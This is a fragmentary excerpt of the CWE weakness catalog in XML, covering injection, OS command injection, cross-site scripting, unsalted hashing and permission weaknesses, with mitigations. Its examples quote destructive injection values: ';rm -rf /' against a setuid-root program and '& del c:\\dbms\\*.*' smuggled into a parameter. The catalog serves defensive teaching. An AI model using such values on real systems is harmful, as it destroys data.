               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>

            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>

            <Note Type="Relationship">
               <xhtml:p>The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc.</xhtml:p>
               <xhtml:p>However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all.</xhtml:p>
               <xhtml:p>The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker.</xhtml:p>

      <Weakness ID="732" Name="Incorrect Permission Assignment for Critical Resource" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.</Description>
         <Extended_Description>When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data.</Extended_Description>

                  <xhtml:p>The developer might make certain assumptions about the environment in which the software runs - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.</xhtml:p>

               <Phase>Installation</Phase>
               <Note>The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged.</Note>

                  <xhtml:p>However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated static analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated static analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.</xhtml:p>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.</xhtml:p>
               </Description>
               <Effectiveness_Notes>Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as "private," but the blog system inadvertently marks it as "public."</Effectiveness_Notes>

      <Weakness ID="74" Name="Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.</Description>
         <Extended_Description>Software has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</Extended_Description>

         <Notes>
            <Note Type="Relationship">In the development view (CWE-699), this is classified as an Input Validation problem (CWE-20) because many people do not distinguish between the consequence/attack (injection) and the protection mechanism that prevents the attack from succeeding. In the research view (CWE-1000), however, input validation is only one potential protection mechanism (output encoding is another), and there is a chaining relationship between improper input validation and the improper enforcement of the structure of messages to other components. Other issues not directly related to input validation, such as race conditions, could similarly impact message structure.</Note>

               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>

                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed.

         <Notes>
            <Note Type="Relationship">Sometimes, when a return value can be used to indicate an error, an unchecked return value is a code-layer instance of a missing application-layer check for exceptional conditions. However, return values are not always needed to communicate exceptional conditions. For example, expiration of resources, values passed by reference, asynchronously modified data, sockets, etc. may indicate exceptional conditions without the use of a return value.</Note>

      <Weakness ID="757" Name="Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.</Description>
         <Extended_Description>When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the software by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.</Extended_Description>

      <Weakness ID="759" Name="Use of a One-Way Hash without a Salt" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>

               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>

               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>

      <Weakness ID="76" Name="Improper Neutralization of Equivalent Special Elements" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software properly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.</Description>
         <Extended_Description>The software may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the software may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the software might filter a dangerous "-e" command-line switch when calling an external program, but it might not account for "--exec" or other switches that have the same semantics.</Extended_Description>

         <Description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software uses a predictable salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>

               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>

               <Description>If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.</Effectiveness_Notes>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">

               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>

            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">

               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">

               </Example_Code>
               <Body_Text>The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.</Body_Text>

            <Note Type="Terminology">
               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
               <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>

                  <xhtml:p>While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.</xhtml:p>
                  <xhtml:p>When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.</xhtml:p>

For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.</xhtml:p>

               <Description>Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.</Description>

                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place.</Note>

      <Weakness ID="779" Name="Logging of Excessive Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.</Description>
         <Extended_Description>While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.</Extended_Description>

      </Weakness>
      <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</xhtml:p>
            <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ol>
                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
               </xhtml:ol>
            </xhtml:div>
            <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>

               <Note>Attackers could execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.</Note>

                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>

               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>

                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</xhtml:p>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>

         <Notes>
            <Note Type="Terminology">The "OS command injection" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an "-exec" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX "find" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.</Note>
            <Note Type="Research Gap">More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.</Note>

      <Weakness ID="782" Name="Exposed IOCTL with Insufficient Access Control" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL.</Description>
         <Extended_Description>
            <xhtml:p>When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.</xhtml:p>
            <xhtml:p>The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely.</xhtml:p>

         <Notes>
            <Note Type="Relationship">This can be primary to many other weaknesses when the programmer assumes that the IOCTL can only be accessed by trusted parties. For example, a program or driver might not validate incoming addresses in METHOD_NEITHER IOCTLs in Windows environments (CWE-781), which could allow buffer overflow and similar attacks to take place, even when the attacker never should have been able to access the IOCTL at all.</Note>
            <Note Type="Applicable Platform">
               <xhtml:p>Because IOCTL functionality is typically performing low-level actions and closely interacts with the operating system, this weakness may only appear in code that is written in low-level languages.</xhtml:p>

      <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Usable">
         <Description>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
         <Extended_Description>
            <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. Untrusted data enters a web application, typically from a web request.</xhtml:div>
               <xhtml:div>2. The web application dynamically generates a web page that contains this untrusted data.</xhtml:div>
               <xhtml:div>3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</xhtml:div>
               <xhtml:div>4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</xhtml:div>
               <xhtml:div>5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</xhtml:div>
               <xhtml:div>6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</xhtml:div>
            </xhtml:div>
            <xhtml:p>There are three main kinds of XSS:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 1: Reflected XSS (or Non-Persistent)</xhtml:div>
               <xhtml:div>The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:div>
            </xhtml:div>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 2: Stored XSS (or Persistent)</xhtml:div>
               <xhtml:div>The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.</xhtml:div>
            </xhtml:div>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 0: DOM-Based XSS</xhtml:div>
               <xhtml:div>In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</xhtml:p>

               <xhtml:p>The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
               <xhtml:div style="color:#32498D; font-weight:bold;">Domain</xhtml:div>
               <xhtml:p>The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>

               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>

